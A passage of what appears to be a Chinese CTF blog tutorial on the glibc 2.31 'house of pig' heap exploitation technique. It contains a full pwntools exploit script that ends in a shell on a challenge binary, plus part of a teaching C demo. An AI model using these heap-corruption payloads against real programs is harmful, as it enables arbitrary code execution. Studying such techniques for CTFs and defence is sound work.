class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;./pig&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">password = [<span class="string">b&#x27;AY7Hr0&#x27;</span>, <span class="string">b&#x27;BRgTa2&#x27;</span>, <span class="string">b&#x27;CnY841&#x27;</span>]</span><br><span class="line">current_user = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content_length, content = <span class="literal">None</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;message size: &#x27;</span>, <span class="built_in">str</span>(content_length).encode())</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        content = <span class="built_in">str</span>(current_user) * (content_length // <span class="number">0x30</span> * <span class="number">0x10</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line">    <span class="keyword">global</span> current_user</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, password[role])</span><br><span class="line">    current_user = role</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署tcache stashing unlink attack的堆环境</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):      <span class="comment"># make 5 chunk into tcache, mummy index 0~4</span></span><br><span class="line">    add(<span class="number">0xA0</span>)</span><br><span class="line">    delete(i)</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x150</span>)    <span class="comment"># peppa index 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x120 tcache, peppa index 1~7</span></span><br><span class="line">    add(<span class="number">0x150</span>)</span><br><span class="line">    delete(i + <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)               <span class="comment"># peppa #0 into unsorted bin</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xA0</span>)               <span class="comment"># mummy index 5, split peppa #0</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x160</span>)              <span class="comment"># peppa index 8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x130 tcache, peppa index 9~15</span></span><br><span class="line">    add(<span class="number">0x160</span>)</span><br><span class="line">    delete(i + <span class="number">9</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">view(<span class="number">8</span>)                 <span class="comment"># get libc base address</span></span><br><span class="line">io.recv(<span class="number">0x10</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ECBE0</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">__free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xB0</span>)               <span class="comment"># mummy index 6, split peppa #8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取堆地址</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line">io.recv(<span class="number">0x10</span>)</span><br><span class="line">heap_address = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)        <span class="comment"># get a heap address</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc base: &#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span>, <span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;__free_hook: &#x27;</span>, <span class="built_in">hex</span>(__free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;_IO_list_all: &#x27;</span>, <span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap address: &#x27;</span>, <span class="built_in">hex</span>(heap_address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># first large bin attack</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x440</span>)     <span class="comment"># mummy index = 7</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 16</span></span><br><span class="line">add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 17</span></span><br><span class="line">add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 18</span></span><br><span class="line">add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 19</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x450</span>)     <span class="comment"># mummy index = 8, switch mummy #7 into large bin</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">17</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">7</span>, (p64(__free_hook - <span class="number">0x18</span> - <span class="number">0x18</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">change_role(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 0, complete first large bin attack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># second large bin attack</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">7</span>, (p64(_IO_list_all - <span class="number">0x20</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">change_role(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 1, complete first large bin attack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache stashing unlink attack</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x40</span> + p64(heap_address + <span class="number">0x410</span>) + p64(__free_hook - <span class="number">0x28</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">change_role(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x230</span>)   <span class="comment"># daddy index = 2</span></span><br><span class="line">change_role(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x430</span>)   <span class="comment"># daddy index = 3</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">7</span>, p64(heap_address + <span class="number">0x19E0</span>) * <span class="number">2</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">change_role(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xA0</span>)   <span class="comment"># daddy index = 4, trigger tcache stashing unlink attack</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE_complete = p64(<span class="number">0</span>) * <span class="number">2</span>  <span class="comment"># _IO_read_end (0x10), _IO_read_base (0x18)</span></span><br><span class="line">fake_IO_FILE_complete += p64(<span class="number">1</span>)     <span class="comment"># _IO_write_base (0x20)</span></span><br><span class="line">fake_IO_FILE_complete += p64(<span class="number">0xFFFF_FFFF_FFFF</span>) <span class="comment"># _IO_write_ptr (0x28)</span></span><br><span class="line">fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_end (0x30)</span></span><br><span class="line">fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span>)  <span class="comment"># _IO_buf_base (0x38)</span></span><br><span class="line">fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span> + <span class="number">30</span>)  <span class="comment"># _IO_buf_end (0x40)</span></span><br><span class="line">fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _mode (0xB0)</span></span><br><span class="line">fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE_complete += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">fake_IO_FILE_complete += p64(libc_base + <span class="number">0x1E9560</span>)</span><br><span class="line">payload = fake_IO_FILE_complete + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span> * p64(system)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>由此，我们就完全解决了house of pig这个问题，但不难发现，这种利用方式需要使用<code>__free_hook</code>，而这个钩子在更高版本的libc中是不存在的。那么在2.35这样的libc中，我们又应该如何进行利用呢？</p><p>其实可以发现，house of pig调用了<code>_IO_str_overflow</code>这个函数，如果我们将<code>vtable</code>也进行伪造，就相当于可以执行任意函数。这个函数的第一个参数就是伪造的<code>FILE</code>结构体自身，如果在结构体开头写入字符串<code>/bin/sh</code>，然后通过伪造的<code>vtable</code>调用<code>system</code>函数，也能够实现同样的功能，再不济要是用了沙箱，也还可以用传统手法——<code>setcontext</code>绕一遍，不过那样的话，题目的流程就太长了。</p><h1 id="4-glibc-2-31版本house-of-pig演示程序"><a href="#4-glibc-2-31版本house-of-pig演示程序" class="headerlink" title="4. glibc 2.31版本house of pig演示程序"></a>4. glibc 2.31版本house of pig演示程序</h1><p>下面是笔者写的演示程序，如有错误请联系笔者指正。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;今天我们来学习一下house of pig的利用原理。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;house of pig在只能使用calloc进行内存分配的CTF赛题中也有用武之地。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;首先我们了解一下这种利用方式的基本原理。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序运行于ubuntu 20.04, glibc版本为2.31-0ubuntu9.9。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在glibc 2.31下，house of pig需要利用__free__hook。\n\n&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;第一步：获取libc的加载地址及堆地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;通过puts函数获取libc加载地址，在本libc中其偏移为0x84420。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;libc的加载地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, libc_base);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;然后我们通过分配一个chunk（大小为0x500）来获得一个堆地址。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> chunk_1 = (<span class="type">size_t</span>) <span class="built_in">malloc</span>(<span class="number">0x4F0</span>) - <span class="number">0x10</span>;</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;获得堆地址为这个chunk的起始地址：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n\n&quot;</span> STR_END, chunk_1);</span><br><span class="line"></span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;第二步：通过large bin attack或其他方法将__free_hook附近写上一个堆地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;为了方便起见，本程序直接对__free_hook附近地址进行修改。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在实际应用中，我们要维护好这个堆地址，在后面的步骤中还会用到。\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT, <span class="string">&quot;这里在__free_hook-0x10处写入刚才获得的堆地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本libc中__free_hook的偏移为0x1EEE48。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> __free_hook = libc_base + <span class="number">0x1EEE48</span>;</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;__free_hook的地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, __free_hook);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* vuln_1 = (<span class="type">size_t</span>*)(__free_hook - <span class="number">0x8</span>);</span><br><span class="line">    <span class="comment">// ---------- 第一处漏洞利用 ---------- //</span></span><br><span class="line">    *vuln_1 = chunk_1;</span><br><span class="line">    <span class="comment">// --------------------------------- //</span></span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;第一处漏洞利用完成，已在__free_hook-0x10处写入堆地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;第三步：通过large bin attack或其他方法向_IO_list_all写入一个堆地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本libc中__free_hook的偏移为0x1ED5A0。\n&quot;</span>);</span><br><span 